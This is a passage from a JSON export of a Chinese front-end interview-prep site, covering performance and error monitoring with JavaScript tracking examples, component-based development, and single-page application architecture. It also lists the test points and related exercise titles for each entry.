的按钮，并在其 `click` 事件上添加监听器。在按钮被点击时调用 `trackEvent` 函数，记录点击事件的类型（`button_click`）、按钮 ID 和时间戳。\n\n```js\n// 跟踪按钮点击事件\nconst button = document.getElementById('myButton'); // 获取按钮元素\nbutton.addEventListener('click', function () {\n    trackEvent('button_click', { buttonId: 'myButton', timestamp: Date.now() }); // 记录点击事件并添加按钮ID和时间戳\n});\n```\n\n**捕获页面滚动事件**：在全局 `scroll` 事件上添加监听器，每当页面发生滚动时调用 `trackEvent` 函数，记录滚动事件的类型（`page_scroll`）、页面垂直滚动距离（`scrollY`）和时间戳。\n\n```js\n// 跟踪页面滚动事件\nwindow.addEventListener('scroll', function () {\n    trackEvent('page_scroll', { scrollY: window.scrollY, timestamp: Date.now() }); // 记录滚动事件并添加滚动位置和时间戳\n});\n```\n\n### 2\\. 完成性能监控指标\n\n我们可以使用 `PerformanceAPI`，来检测某些操作需要多长时间。如：页面加载时间和 API 调用耗时的监控:\n\n**页面加载时间监控**：通过 `window.addEventListener('load')` 监听页面加载完成的事件，在页面完全加载后获取当前时间（使用 `performance.now()`），计算出页面加载的总耗时（从页面初始化到加载完成的时间），并通过 `trackEvent` 函数将事件类型、耗时数据等记录下来。\n\n```javascript\n// 测量页面加载时间\nwindow.addEventListener('load', function () {\n    const pageLoadTime = performance.now(); // 获取页面加载完成后的时间（毫秒）\n    trackEvent('page_load', { duration: pageLoadTime }); // 记录页面加载事件，并包含加载耗时数据\n});\n```\n\n**API 调用耗时监控**：在 `measureApiCallPerformance` 函数中使用 `performance.now()` 获取调用 API 前的开始时间，通过 `fetch` 方法发起网络请求并在响应返回后再次获取时间差，计算 API 请求的总耗时。将 API 耗时和接口地址等信息通过 `trackEvent` 函数记录下来。\n\n```js\n// 测量 API 调用的耗时\nfunction measureApiCallPerformance() {\n    const start = performance.now(); // 记录 API 调用的开始时间\n\n    fetch('https://api.sunday.com/data')\n        .then(response => response.json())\n        .then(data => {\n            const duration = performance.now() - start; // 计算 API 调用的耗时\n            trackEvent('api_call', { duration: duration, endpoint: 'https://api.sunday.com/data' }); // 记录 API 调用事件，并包含耗时和接口地址\n        });\n}\n```\n\n### 3\\. 进行错误追踪监听\n\n我们可以利用 `window.onerror` 回调或者直接使用一些库（如：`Sentry`）完成错误监听：\n\n**基础错误跟踪**：通过 `window.onerror` 捕获全局 JavaScript 错误。当错误发生时，`window.onerror` 会自动获取错误的详细信息（如错误信息、文件、行号、列号及堆栈信息），并将这些信息通过 `trackEvent` 函数发送到后台，用于后续的错误分析和排查。\n\n```javascript\n// 使用 window.onerror 实现基础的错误跟踪\nwindow.onerror = function (message, source, lineno, colno, error) {\n    // 捕获 JavaScript 错误信息，并通过 trackEvent 函数记录\n    trackEvent('js_error', {\n        message: message,      // 错误信息\n        source: source,        // 错误发生的文件\n        lineno: lineno,        // 错误所在的行号\n        colno: colno,          // 错误所在的列号\n        error: error ? error.stack : '' // 错误的堆栈信息（如果有）\n    });\n};\n```\n\n**第三方错误跟踪服务（Sentry）**：Sentry 是一个常用的错误监控服务。通过 `dsn` 配置唯一的项目标识，之后可以使用 `Sentry.captureException` 方法捕获并上报自定义错误。这种方式适合用于捕获更多类型的异常并进行详细的错误分析。\n\n```js\n// 使用第三方服务 Sentry 进行错误跟踪\nSentry.init({ dsn: 'https://examplePublicKey@o0.ingest.sentry.io/0' }); // 初始化 Sentry\nSentry.captureException(new Error('在这里描述错误内容')); // 捕获并上报自定义错误\n```\n\n### 4\\. 自定义的埋点上报\n\n有时候我们可能还需要进行一些特别要求的数据上报，比如：**跟踪用户在页面特定区域的停留时间**，一共分成三步来做：\n\n1.  当用户的鼠标进入指定区域（ID 为 `sectionId`）时，通过 `mouseenter` 事件记录进入的时间戳 `sectionStartTime`。\n2.  当用户的鼠标离开该区域时，通过 `mouseleave` 事件获取当前时间，计算用户在该区域的停留时长 `timeSpent`。\n3.  将停留时间和区域标识一起通过 `trackEvent` 函数发送到分析系统，方便后续分析用户在页面不同区域的停留时长\n\n```javascript\n// 跟踪用户在页面特定区域的停留时间\nlet sectionStartTime = 0; // 记录进入区域的时间\nconst sectionElement = document.getElementById('sectionId'); // 获取目标区域的 DOM 元素\n\n// 当用户鼠标进入该区域时触发\nsectionElement.addEventListener('mouseenter', function () {\n    sectionStartTime = Date.now(); // 记录进入区域的时间戳\n});\n\n// 当用户鼠标离开该区域时触发\nsectionElement.addEventListener('mouseleave', function () {\n    const timeSpent = Date.now() - sectionStartTime; // 计算停留时间\n    trackEvent('time_spent', { section: 'sectionId', duration: timeSpent }); // 上报停留时间和区域标识\n});\n```\n\n### 5\\. 局部小总结\n\n通过以上的几个案例，我们可以再次明确：**监控核心就是获取关键的数据，发送（上报）给服务端**\n\n我们只需要 **依照自己的需求**，找到对应的 **事件节点**，获取 **需要上报的数据**，通过接口传递给服务端即可。\n\n> PS：这里需要注意的是 **上报的方式分为：【统一上报】和 【实时上报】** 两大类，这里不去细说。\n\n因此，想要完成监控，那么就需要更加深入的了解关键事件节点，如：浏览器窗口事件、鼠标事件、键盘事件、表单事件 甚至是 DOM 是否可见\n\n## 三、一个完整的表单监控示例\n\n那么接下来咱们就完成一个表单监控示例。他可以监控到 **浏览量、按钮点击量和表单提交量** 等\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n\t<head>\n\t\t<meta charset=\"UTF-8\" />\n\t\t<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n\t\t<title>表单行为跟踪示例</title>\n\t</head>\n\t<body>\n\t\t<!-- 示例表单 -->\n\t\t<h1>用户注册表单</h1>\n\t\t<form id=\"registrationForm\">\n\t\t\t<label for=\"username\">用户名：</label>\n\t\t\t<input type=\"text\" id=\"username\" name=\"username\" required />\n\t\t\t<br /><br />\n\n\t\t\t<label for=\"email\">邮箱：</label>\n\t\t\t<input type=\"email\" id=\"email\" name=\"email\" required />\n\t\t\t<br /><br />\n\n\t\t\t<label for=\"password\">密码：</label>\n\t\t\t<input type=\"password\" id=\"password\" name=\"password\" required />\n\t\t\t<br /><br />\n\n\t\t\t<button type=\"button\" id=\"submitButton\">注册</button>\n\t\t</form>\n\n\t\t<script>\n\t\t\t// 通用跟踪函数：用于记录事件并发送到服务器\n\t\t\tfunction trackEvent(eventType, details) {\n\t\t\t\tconsole.log(`Event: ${eventType}`, details)\n\t\t\t\t// 将数据发送到分析服务\n\t\t\t\tfetch('/请求路径', {\n\t\t\t\t\tmethod: 'POST',\n\t\t\t\t\theaders: { 'Content-Type': 'application/json' },\n\t\t\t\t\tbody: JSON.stringify({ eventType, details })\n\t\t\t\t})\n\t\t\t}\n\n\t\t\t// 1. 监控页面浏览量\n\t\t\twindow.addEventListener('load', function () {\n\t\t\t\ttrackEvent('page_view', {\n\t\t\t\t\turl: window.location.href,\n\t\t\t\t\ttimestamp: Date.now()\n\t\t\t\t})\n\t\t\t})\n\n\t\t\t// 2. 监控输入字段聚焦事件\n\t\t\tconst inputFields = document.querySelectorAll('#registrationForm input')\n\t\t\tinputFields.forEach((field) => {\n\t\t\t\tfield.addEventListener('focus', function () {\n\t\t\t\t\ttrackEvent('input_focus', {\n\t\t\t\t\t\tfieldName: field.name,\n\t\t\t\t\t\ttimestamp: Date.now()\n\t\t\t\t\t})\n\t\t\t\t})\n\t\t\t})\n\n\t\t\t// 3. 监控按钮点击量\n\t\t\tconst submitButton = document.getElementById('submitButton')\n\t\t\tsubmitButton.addEventListener('click', function () {\n\t\t\t\ttrackEvent('button_click', {\n\t\t\t\t\tbuttonId: 'submitButton',\n\t\t\t\t\ttimestamp: Date.now()\n\t\t\t\t})\n\n\t\t\t\t// 模拟提交表单，调用表单提交处理逻辑\n\t\t\t\thandleSubmit()\n\t\t\t})\n\n\t\t\t// 4. 监控表单提交量\n\t\t\tconst form = document.getElementById('registrationForm')\n\t\t\tfunction handleSubmit() {\n\t\t\t\t// 验证表单是否有效（如果需要可以增加更多验证逻辑）\n\t\t\t\tif (form.checkValidity()) {\n\t\t\t\t\ttrackEvent('form_submit', {\n\t\t\t\t\t\tformId: 'registrationForm',\n\t\t\t\t\t\tformData: {\n\t\t\t\t\t\t\tusername: form.username.value,\n\t\t\t\t\t\t\temail: form.email.value,\n\t\t\t\t\t\t\tpassword: form.password.value // 注意：实际场景中避免记录敏感信息\n\t\t\t\t\t\t},\n\t\t\t\t\t\ttimestamp: Date.now()\n\t\t\t\t\t})\n\n\t\t\t\t\t// 模拟发送表单数据到服务器\n\t\t\t\t\tfetch('/请求路径', {\n\t\t\t\t\t\tmethod: 'POST',\n\t\t\t\t\t\tbody: new FormData(form)\n\t\t\t\t\t})\n\t\t\t\t\t\t.then((response) => response.json())\n\t\t\t\t\t\t.then((data) => {\n\t\t\t\t\t\t\tconsole.log('Form submitted successfully', data)\n\t\t\t\t\t\t})\n\t\t\t\t} else {\n\t\t\t\t\talert('请填写完整表单')\n\t\t\t\t}\n\t\t\t}\n\t\t</script>\n\t</body>\n</html>\n```\n\n测试执行结果如下：\n\n![](https://static.ecool.fun//article/8bd3b381-6e05-443f-b15a-13171fbb8fba.awebp)",
    "testPoint": "## 一、性能监控的整体认知\n\n**考察点：**\n\n* 是否理解性能监控与性能优化的区别。\n  （监控是“量化和发现问题”，优化是“解决问题”）\n* 是否能从“用户体验”出发定义性能指标，而不仅是代码层面。\n* 是否知道前端性能监控的两大手段：\n\n  1. **RUM（Real User Monitoring）真实用户监控**\n  2. **Synthetic Monitoring** 合成监控（如 Lighthouse、Puppeteer 定期检测）\n\n---\n\n## 二、关键性能指标（Core Web Vitals 与传统指标）\n\n**考察点：**\n\n1. **页面加载类指标**\n\n   * **FP（First Paint）**\n   * **FCP（First Contentful Paint）**\n   * **LCP（Largest Contentful Paint）**\n   * **TTFB（Time To First Byte）**\n   * **DomContentLoaded / Load / Fully Loaded**\n   * **FID（First Input Delay）**\n   * **INP（Interaction to Next Paint）**\n   * **CLS（Cumulative Layout Shift）**\n   * 是否能解释这些指标代表的含义及优化方向。\n\n2. **资源加载类指标**\n\n   * JS/CSS 体积、请求耗时、压缩率、缓存命中率\n   * 图片资源大小与懒加载情况\n\n3. **网络层指标**\n\n   * DNS 查询耗时、TCP 建立、SSL 握手、HTTP 请求阶段拆解\n\n---\n\n## 三、性能数据采集方式\n\n**考察点：**\n\n* **Performance API**（`performance.timing`、`performance.getEntriesByType`）\n* **PerformanceObserver** 监听指标变化（LCP、FID、CLS 等）\n* **Resource Timing API**、**Navigation Timing API**\n* 是否了解如何在 SPA 场景中统计页面切换性能（通过路由变化重新计算）\n* 是否能区分**页面初次加载**与**二次加载（缓存命中）**性能差异\n\n---\n\n## 四、异常与上报机制\n\n**考察点：**\n\n* 前端性能数据如何**采集、聚合、上报**\n\n  * 异步批量上报机制（`sendBeacon` / `navigator.sendBeacon`）\n  * 上报策略（定时、限频、合并）\n* 性能数据如何与用户维度或页面维度做关联（userId、sessionId、pageKey）\n* 是否考虑埋点 SDK 的轻量化与对性能的反噬影响\n\n---\n\n## 五、监控平台设计与落地\n\n**考察点：**\n\n* 是否了解前端监控平台的组成：\n\n  1. 数据采集 SDK\n  2. 数据上报 API\n  3. 数据存储与聚合（如 Elasticsearch、ClickHouse）\n  4. 数据可视化展示（如 Grafana、ECharts）\n* 是否考虑在监控中结合**错误监控**与**白屏监控**\n* 是否提到核心指标的报警机制（如 LCP > 4s，自动报警）\n\n---\n\n## 六、性能问题定位与追踪\n\n**考察点：**\n\n* 是否有实际使用过性能分析工具：\n\n  * Chrome Performance、Lighthouse、WebPageTest\n  * Sentry Performance、阿里 ARMS、字节 ApmPlus\n* 是否能解释如何定位性能瓶颈（CPU、网络、渲染）\n* 是否能讲出真实业务场景下的优化闭环：\n\n  * 采集 → 统计 → 报警 → 优化 → 验证 → 回归\n\n---\n\n## 七、进阶与拓展方向\n\n**考察点：**\n\n* 是否理解前端性能与后端接口性能的联动（TTFB 分析）\n* 是否了解移动端性能监控（Hybrid、小程序）\n* 是否知道 RUM + APM 的一体化监控思路（如前后链路追踪 TraceId）\n\n\n",
    "exerciseKeyList": "[\"afa95f31-3fde-4017-b247-c901df3c8fc9\",\"965b51c6-398a-4d51-978b-01ebbffd1ede\",\"dda1ce4e-518b-4023-898b-eeb9db4e9b51\",\"a2fc1424-164d-41c5-a366-0e118ccb2f09\",\"ef44e03d-4f04-4aed-8bbe-fb6c7435dffd\",\"a043bcc6-f419-471d-a4cb-4e927daaaf3c\",\"26e22fa9-becc-4552-b79a-da2f67451455\"]",
    "vipLimit": 1,
    "level": 2.5,
    "pointOrder": 1,
    "createAt": "2025-08-07T03:13:51.000Z",
    "updateAt": "2025-10-23T08:34:08.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "26e22fa9-becc-4552-b79a-da2f67451455",
        "title": "前端性能优化指标有哪些？怎么进行性能检测？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-04-05T10:40:13.000Z",
        "updateAt": "2024-08-10T17:06:27.000Z"
      },
      {
        "exerciseKey": "965b51c6-398a-4d51-978b-01ebbffd1ede",
        "title": "做前端错误监控时，有什么办法能将报错的源码地址，包括代码行数也进行上报吗？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:29:51.000Z",
        "updateAt": "2025-07-17T01:42:56.000Z"
      },
      {
        "exerciseKey": "a043bcc6-f419-471d-a4cb-4e927daaaf3c",
        "title": "怎么统计页面的性能指标？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:22.000Z",
        "updateAt": "2024-09-05T01:27:39.000Z"
      },
      {
        "exerciseKey": "a2fc1424-164d-41c5-a366-0e118ccb2f09",
        "title": "以用户为中心的前端性能指标有哪些？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:41.000Z",
        "updateAt": "2024-09-13T01:16:43.000Z"
      },
      {
        "exerciseKey": "afa95f31-3fde-4017-b247-c901df3c8fc9",
        "title": "如何监控前端页面的崩溃？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:41.000Z",
        "updateAt": "2024-08-14T20:32:53.000Z"
      },
      {
        "exerciseKey": "dda1ce4e-518b-4023-898b-eeb9db4e9b51",
        "title": "Node性能如何进行监控以及优化？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-25T02:23:49.000Z",
        "updateAt": "2025-07-16T11:49:57.000Z"
      },
      {
        "exerciseKey": "ef44e03d-4f04-4aed-8bbe-fb6c7435dffd",
        "title": "衡量页面性能的指标有哪些？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:22.000Z",
        "updateAt": "2024-09-05T01:25:42.000Z"
      }
    ]
  },
  "271": {
    "id": 271,
    "tagId": 28,
    "title": "前端组件化开发",
    "explanation": "## 背景\n\n不知道你有没有遇到过以下场景:\n\n-   页面逻辑越来越多,代码越来越庞大,写到后面难以 hold 住所有逻辑,很容易牵一发而动全身.\n-   你负责的页面好好的突然出现问题,查到最后是别人代码影响.\n-   同样的逻辑在多个地方重复书写,每次一改要改一批文件\n\n随着前端项目复杂度的急剧增加, 上面列出的几种场景就是传统开发中会出现的问题. 也是前端组件化出现的原因.\n\n-   项目复杂度增加, 一个页面一个文件需要处理的内容过多.\n-   重复性劳动多, 效率低\n-   质量差, 不可控\n\n## 组件化初探\n\n正是由于出现了这样的问题, 为了在越来越复杂的前端项目中提高开发效率和保证开发质量, 各路大神们开始通过各种方式来尝试解决问题.\n\n曾经非常火的 jQuery 就基于自己建立了 jQuery 插件机制. 你可以将一些常用逻辑进行封装变成 jQuery 插件, 还可以将插件开源进行共享. 比如纯手写会吐血的日期时间选择器,轮播, 多级菜单等等. 你可以在[这里](https://plugins.jquery.com/ \"https://plugins.jquery.com/\")浏览更多jQuery插件.\n\njQuery 插件的用法通常是:\n\n```js\n$(\".select\").pluginName(config)\n```\n\n除了 jQuery 插件模式, 还有一种常见模式是对象模式. 这种模式现在仍然有很多优秀的库在被我们直接或者间接使用. 比如: [swiper](https://swiperjs.com/ \"https://swiperjs.com/\")\n\n对象模式的写法:\n\n```html\n<!-- Slider main container -->\n<div class=\"swiper-container\">\n    <!-- Additional required wrapper -->\n    <div class=\"swiper-wrapper\">\n        <!-- Slides -->\n        <div class=\"swiper-slide\">Slide 1</div>\n        <div class=\"swiper-slide\">Slide 2</div>\n        <div class=\"swiper-slide\">Slide 3</div>\n        ...\n    </div>\n</div>\n\n<script src=\"path/to/swiper.min.js\"></script>\n<script>\n  var mySwiper = new Swiper ('.swiper-container', {\n    direction: 'vertical',\n    loop: true,\n  })\n  </script>\n```\n\n对象模式通过配置创建对象, 通常创建对象的参数中有一项是元素/元素选择器, 通过js代码将逻辑与这个元素紧密绑定.\n\n除了各路大神提出这这些封装代码的模式, 前端标准也在探索组件化模式, webComponent 是 W3C 提出的一种自定义标签模式, 但是其实现繁琐, 目前支持度并不是很好, 这里就不详细说明. 详细的实现示例参看[这里](https://github.com/mdn/web-components-examples \"https://github.com/mdn/web-components-examples\")\n\n## 现代组件结构\n\n经过前端工程师不断的探索, 目前组件化的思想已经在前端项目开发中获得广泛的使用, 最流行的前端框架 Vue React 已经是组件化的集大成者 (虽然二者内涵的东西不止是组件化). 我们先来看一下我们希望组件是一个怎样的存在.\n\n首先, 组件必须是高内聚低耦合的. 当我们开始用组件的思想看待页面时, 页面便不再是 dom 元素的组合, 而是不同组件的组合. 但是由于前端基础技术栈的原因, html css js 运行在一个页面上时是没有隔离的, 也就是说 js 可以根据选择器获取到任意的 dom 节点, 一条 css 规则也会应用在文档中所以满足规则的节点, js 代码中可以随意的创建和使用全局变量. 所以解决隔离是组件的基础要求.\n\n其次, 组件是具有一定意义的功能集合体. 通常组件可以有自己的名字, 比如, 轮播组件, 表格组件, 分页组件, 导航组件. 有名字代表我们把它看成一个个体, 能完成这个个体需要完成的功能. 当然这个个体是可以有层次的, 比如, 表格组件里面可能是表头组件和表主题组件的组合. 这就类似学生, 老师, 学校但是不会有把学生的一半跟老师一半加在一起的东西. 学生是可以完成独立功能的, 这样的抽象就有意义. 看到这里, 你可能发现这跟面向对象有一定的相似性. 我认为二者在思想上确实是相似的.\n\n了解前端组件需要做到怎样的要求, 现在我们具体看下一个组件的结构:\n\n### UI\n\n前端的工作是不可能与 UI 分开的, 绝大部分的组件是带着 UI 的. 当然也有一部分容器类组件并不需要 UI. 我们把 UI 主要分成两个部分, 内容和样式. 这样似乎与 HTML 和 CSS 分别对应上了, 那与传统的开发有什么区别呢? 区别就在于我们在上文提到的隔离. 受限于前端基础技术栈的原因, 并不能做到完全的隔离, (web component 是打算从基础的部分解决这个问题) 但是使用各种方式, 比如在 webpack 中做一些额外的处理, 帮助我们做到隔离, 通常按照标准的写法是不会对外部产生不可控的影响的.\n\n举例来说: vue 的单文件组件, template 和 style 部分就对应了内容和样式, 当然描述为渲染和样式更为准确. template 限制了只能书写组件的内容, style 加上 scoped 配置. 如下图, 在渲染成具体的 dom 的时候, vue 会给对应元素加上唯一标志, 并在选择器中带上这个标志. 以这种方式来保证组件间样式的隔离.\n\n![](https://static.ecool.fun//article/8d8e363a-38e3-4173-98d6-6a9aeae1e0ee.)\n\n### attribute, property, status, method\n\n这四个部分便于组件的功能逻辑紧密相关. 对于学习过面向对象设计的同学应该会很熟悉几个内容, attribute 与 property 是初始化时的配置部分, status 是运行时的内部状态变量, method 是提供的方法.\n\n组件配置: 为什么会有 attribute 与 property 两个部分用来描述配置呢? 首先组件是对 HTML 元素的扩展, attribute 便是承接与 HTML 元素的设计. HTML 的元素在书写的时候可以添加 attribute, 但是受限于形式 attribute 仅是字符串格式, 因为我们是写在 html 文件中的. 但是我们都应该有经验, 对一个组件的配置不可能只有字符串的, 比如, 我们在使用 swiper 轮播组件时, 我们可以配置轮播动画的时长, 是否自动轮播等. 这时候我们往往会使用 js 的形式, 并传一个对象进去. 这种通过 js 来配置组件时传的值, 叫做 property. attribute 与 property 通常是有对应关系的, 我的建议是不需要太关心他们的区别, 比如, 我们现在使用的 vue 和 react 实际就抹平了二者的差别, 你可以说都是 property. 比如 vue 的模板语法中, `:attr=\"object\"` 加了冒号的属性内容就可以被自动解析. jsx 语法中 `attr={js}` 也是不再限于字符串.\n\n内部状态 status: 内部状态就是组件运行时, 不需要暴露给外部但是内部需要的变量. 这一定程度上可以看成我们写代码中的局部变量.\n\n方法 method: 顾名思义方法就是组件提供的功能. 比如, 对于一个轮播组件会有的方法有: 停止/开始自动轮播, 轮播到某项等.\n\n### 生命周期\n\n生命周期通常有, 创建, 挂载, 销毁前等, vue 和 react 设计了更细粒度的生命周期.\n\n为什么要有生命周期, 因为我们在设计好一个组件已经组件的功能时, 我们需要在一些特定的时候执行一些代码, 比如初始化动作, 获取数据动作等. 我们把做这些动作的时机整理后发现, 我们往往需要在创建的时候需要做一些动作, 在构建好组件的 dom 挂载到页面的时候需要做一些动作, 在销毁前需要做一些动作比如内存释放等. 因此这些时机也在现代框架中得到了标准的支持.\n\n## 组件化对当前前端工作的影响\n\n上面内容我们讨论了前端为什么会进行组件化, 已经现代的组件抽象模型是什么. 那学习和理解组件化对我们工作有什么影响呢?\n\n首先, 组件化成为工作必备技能之一, 现代的前端开发工作是必须要求你会一种框架的, 三大框架之一. 而三大框架都深深的蕴含了组件化的思想.\n\n其次, 理解组件化对于可以帮助我们更好的使用框架进行工作内容的拆分和维护. 如果你是团队的 leader, 如何更好的拆分项目的工作如何让团队成员更好的合作, 组件化能力是必须的.",
    "testPoint": "## 一、组件化的认知与本质\n\n**考察重点：**\n\n* 是否理解组件化的核心目标：**复用、解耦、可维护、可组合**\n* 能否解释“组件”与“模块”的区别（UI + 状态 + 逻辑 vs 单纯逻辑或数据单元）\n* 是否了解组件化发展脉络：\n  模板拼接时代 → Vue/React 的声明式组件 → 现代函数式组件设计\n\n**典型提问：**\n\n* 你如何理解前端组件化？\n* 组件化开发解决了哪些传统前端开发痛点？\n* 模块化（如 ES Module）与组件化有什么区别？\n\n---\n\n## 二、组件设计原则\n\n**考察重点：**\n\n* **单一职责原则（SRP）**：一个组件只负责一件事\n* **高内聚低耦合**：组件内部逻辑完整，外部依赖最小化\n* **可复用性与可组合性**\n* **状态提升与数据下传**\n* **通用组件 vs 业务组件 vs 页面组件** 的分层设计\n\n**典型提问：**\n\n* 设计组件时，你如何判断逻辑是否应该拆分？\n* 如何避免组件间过度耦合？\n* 你在项目中如何区分通用组件与业务组件？\n\n---\n\n## 三、组件通信机制\n\n**考察重点：**\n\n* **父子通信**：props / emit / callback / ref\n* **兄弟通信**：事件总线 / 状态提升 / context / store\n* **跨层通信**：context、依赖注入（Vue provide/inject）\n* **全局状态管理**：Redux / Zustand / Pinia / Vuex\n\n**典型提问：**\n\n* 组件之间有哪些通信方式？\n* React 中如何避免过深的 props 传递？\n* Vue 中 provide/inject 的原理是什么？\n\n---\n\n## 四、组件状态与数据流\n\n**考察重点：**\n\n* **受控组件与非受控组件**（React）\n* **单向数据流思想**\n* **局部状态 vs 全局状态的划分**\n* **状态同步、缓存、懒加载、数据提升**\n\n**典型提问：**\n\n* React 组件中，受控与非受控组件的区别是什么？\n* 组件状态应该存在哪里？\n* 如何在多个组件间共享状态而不引起频繁重渲染？\n\n---\n\n## 五、组件复用与抽象\n\n**考察重点：**\n\n* **高阶组件（HOC）**\n* **Render Props**\n* **自定义 Hooks / Composition API**\n* **Slot / children / 动态插槽**\n* **通用组件库设计（Button、Form、Table）**\n* 是否具备抽象复杂逻辑为可复用单元的能力\n\n**典型提问：**\n\n* 你在项目中是否写过自定义 Hook？\n* HOC 与自定义 Hook 的区别是什么？\n* 在 Vue3 中如何通过组合式 API 抽象逻辑？\n\n---\n\n## 六、组件性能与渲染优化\n\n**考察重点：**\n\n* React：memo、useMemo、useCallback、虚拟化渲染、懒加载\n* Vue：v-once、keep-alive、计算属性缓存、异步组件\n* Diff 算法与重渲染机制理解\n* key 的作用与渲染性能影响\n* 大组件拆分、异步加载与按需渲染策略\n\n**典型提问：**\n\n* React 组件频繁重渲染的原因有哪些？\n* 你如何设计高性能的长列表组件？\n* Vue 的虚拟 DOM 如何帮助组件更新性能？\n\n---\n\n## 七、组件工程化与生态建设\n\n**考察重点：**\n\n* **组件库搭建与打包（rollup、vite、storybook）**\n* **按需引入与 Tree-shaking**\n* **样式隔离与命名规范（CSS Module、Scoped、BEM、Tailwind）**\n* **组件测试（Jest、Testing Library、Cypress）**\n* **版本管理与发布（npm publish、Monorepo 管理）**\n\n**典型提问：**\n\n* 你有没有参与过组件库开发？\n* 组件样式冲突如何处理？\n* 如何让组件支持按需加载与主题定制？\n\n---\n\n## 八、可维护性与可扩展性\n\n**考察重点：**\n\n* 是否关注组件的 **接口设计（props）清晰度**\n* 是否考虑 **可测试性、可扩展性**\n* 是否遵循一致的命名规范与目录结构\n* 是否关注团队协作下的组件复用体系（组件资产化）\n\n**典型提问：**\n\n* 如何设计一个长期可维护的组件？\n* 组件 Props 过多时该如何优化？\n* 如何让一个组件支持多主题或动态配置？\n",
    "exerciseKeyList": "[\"35996816-36ac-45ba-ae5e-8bebbede73d1\",\"e252d8f2-de0c-43a7-9799-06e965b08b61\",\"3589263a-683a-47d2-8716-191cd1d393bf\",\"0ee642b5-d48b-4295-850f-f96a933b4910\"]",
    "vipLimit": 1,
    "level": 3,
    "pointOrder": 1,
    "createAt": "2025-08-07T03:17:36.000Z",
    "updateAt": "2025-10-23T08:39:37.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "0ee642b5-d48b-4295-850f-f96a933b4910",
        "title": "在项目中封装组件时，你会有些什么样的原则？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:14.000Z",
        "updateAt": "2024-10-29T01:54:42.000Z"
      },
      {
        "exerciseKey": "3589263a-683a-47d2-8716-191cd1d393bf",
        "title": "说说你对 Vue 中异步组件的理解",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2024-12-15T12:29:39.000Z",
        "updateAt": "2024-12-15T12:33:48.000Z"
      },
      {
        "exerciseKey": "35996816-36ac-45ba-ae5e-8bebbede73d1",
        "title": "如果你有一个业务组件库，希望打包输出为 esm + cjs + dts，有什么思路？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2025-05-15T08:44:38.000Z",
        "updateAt": "2025-05-15T08:44:43.000Z"
      },
      {
        "exerciseKey": "e252d8f2-de0c-43a7-9799-06e965b08b61",
        "title": "如何封装一个 AI 图片生成组件，支持选择模型、输入 prompt、展示图像并支持本地保存？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2025-04-14T02:03:09.000Z",
        "updateAt": "2025-07-16T14:56:28.000Z"
      }
    ]
  },
  "272": {
    "id": 272,
    "tagId": 28,
    "title": "单页面架构",
    "explanation": "### 传统的多页面应用构建方式：\n\n* 纯服务端渲染，前后端不分离，使用`jsp`,`jade`,'ejs','tempalte'等技术在后台先拼接成对应的`HTML`结构，然后转换成字符串，在每个对应的路由返回对应的数据（文件）即可\n\n> `Jade`模版服务端渲染，代码实现：\n\n```\nconst express= require('express')\nconst app =express()\nconst jade = require('jade')\nconst result = ***\nconst url path = ***\nconst html = jade.renderFile(url, { data: result, urlPath })//传入数据给模板引擎\napp.get('/',(req,res)=>{\n    res.send(html)//直接吐渲染好的`html`文件拼接成字符串返回给客户端\n}) //RestFul接口\n\napp.listen(3000,err=>{\n    //do something\n})\n\n```\n\n* 使用`jQuery`等传统库绘制的前端页面\n\n### 传统前后端不分离，服务端渲染的优缺点：\n\n#### 优点：\n\n* `SEO`友好，因为返回给前端的是渲染好的`HTML`结构，里面的内容都可以被爬虫抓取到。\n* 对于一些应用性能等要求不高的项目，比如某个公司的静态网页，内容很少的情况下，直接一把梭就好，不用再搭建工程化的环境等\n* 对于后端程序员（全干工程师）来说，不用去特意学习前端框架，公司也不用特意去招聘前端\n* 兼容性好，传统服务端渲染多页面应用吐出来的都是字符串，`HTML`结构\n\n#### 缺点：\n\n* 如果项目很大，不利于维护，据我所知，目前很多云计算公司，还有不少都是使用非单页面应用，例如一个几十万行的项目是用`jQuery`写的，如果注释和文档不是非常齐全，那么真的会无从下手\n* 性能和用户体验，不能跟单页面应用相比\n* 后期迭代，升级空间不大，目前大部分写得比较好的库，都建立`vue,react`等框架基础上，他们都有一套自己的运行机制，有自己的生命周期，并且不像传统的应用，还加上了一层虚拟`DOM`以及`diff`算法\n* 现在类似`Ant-Design-pro`这样的开箱即用的库已经很多，单页面应用的学习和开发成本已经很低很低，如果还在使用传统的技术去开发新的应用，对于开发人员多内心来说也是一种折磨。\n\n> 这里并不是说多页面应用不好，只能说各有各自的好，单页面应用如果通过大量的极致优化手段，是可以从不少方面跟原生一拼。\n\n![](https://static.ecool.fun//article/a0ed6d1c-5886-42f7-8d21-6406fd7a5c0d.awebp)\n\n## 目前的单页面应用：\n\n* 只有一张Web页面的应用，是一种从Web服务器加载的富客户端，单页面跳转仅刷新局部资源 ，公共资源(js、css等)仅需加载一次，常用于PC端官网、购物等网站\n* 其实只有一个空的`DIV`标签，其他都是`js`动态生态的内容\n\n### 单页面应用实现步骤：\n\n#### 代码实现：\n\n* 首先是一个静态模板文件 `index.html`\n\n```\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\n    <title>Document</title>\n</head>\n\n<body>\n    <div id=\"root\"></div>\n</body>\n<script>\n\n</script>\n\n</html>\n\n```\n\n* 在`vue react`框架的入口文件中指定对应的渲染元素：\n\n```\nimport React from 'react;\nimport ReactDOM from 